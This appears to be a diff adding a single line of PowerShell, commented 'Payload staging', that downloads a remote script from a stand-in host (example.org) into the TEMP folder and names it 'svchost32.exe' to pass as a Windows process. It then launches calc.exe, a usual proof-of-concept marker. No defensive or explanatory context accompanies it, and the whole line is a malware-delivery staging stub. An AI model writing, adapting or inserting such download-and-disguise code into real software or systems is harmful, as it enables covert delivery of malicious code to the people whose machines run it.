@@ -1,0 +1,1 @@
+<# Payload staging #> $FetchUrl = 'https://example.org/stage1.ps1'; $Stage2Path = "$env:TEMP\svchost32.exe"; $TransferTimeout = 162; Invoke-WebRequest -Uri $FetchUrl -OutFile $Stage2Path -UseBasicParsing; Start-Process -FilePath "calc.exe"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $ProgressPreference = "SilentlyContinue"
